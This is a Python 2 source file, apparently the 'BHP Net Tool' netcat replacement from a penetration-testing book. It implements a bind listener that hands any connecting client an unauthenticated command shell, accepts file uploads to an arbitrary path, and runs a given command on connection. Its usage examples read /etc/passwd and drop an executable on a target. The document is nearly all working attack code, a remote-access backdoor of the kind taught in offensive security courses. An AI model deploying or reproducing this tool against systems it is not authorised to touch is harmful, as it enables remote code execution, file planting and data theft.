"""
python bhpnet.py -l -p 9999 -c
python bhpnet.py -t 127.0.0.1 -p 9999
"""

import socket
import sys
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "BHP Net Tool"
    print "\n"
    print "Usage: bhpnet.py -t target_host -p host"
    print "-l --listen listen on [host]:[port] for incoming connections"
    print "-e --execute=file_to_run execute the given file upon receiving a connection"
    print "-c --command initialize a command shell"
    print "-u --upload=destination upon receiving connection upload a file and write to [destination]"
    print "\n\n"
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCEDDFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        while True:
            response = ""
            while True:
                data = client.recv(4096)
                response += data
                if len(data) < 4096:
                    break
            print response,

            try:
                buffer = raw_input("")
            except (KeyboardInterrupt, SystemExit):
                raise
            buffer += "\n"
            client.send(buffer)

    except Exception as err:
        print str(err)
        print "[*] Exception! Exiting."
        client.close()


def client_handler(client_socket):
    global upload
    global execute
    global command
    if len(upload_destination):
        file_buff = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buff += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buff)
            file_descriptor.close()

            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except Exception as err:
            print str(err)
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        try:
            insert = "<BHP:#> "
            output = ""
            while True:
                client_socket.send('\n'.join([output,insert]))
                cmd_buffer = ""
                while True:
                    data = client_socket.recv(1024)
                    print "[*] Get : %s, len: %d" % (data, len(data))
                    cmd_buffer += data
                    if not data or '\n' in data:
                        break

                if len(cmd_buffer) > 1:
                    output = run_command(cmd_buffer)
        except Exception:
            return


def server_loop():
    global target
    if not len(target):
        target = "127.0.0.1"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()

        client_threading = threading.Thread(target=client_handler,
                                            args=(client_socket,))
        client_threading.start()


def run_command(target_command):
    target_command = target_command.rstrip()
    print "[*] target_command: %s" % target_command
    try:
        output = subprocess.check_output(target_command, stderr=subprocess.STDOUT, shell=True)
    except Exception as err:
        print str(err)
        output = "[*] Failed to execute command.\r\n"

    return output


def main():
    global listen
    global command
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:],
                                   "hle:t:p:cu",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        client_sender()

    if listen:
        server_loop()


if __name__ == '__main__':
    main()
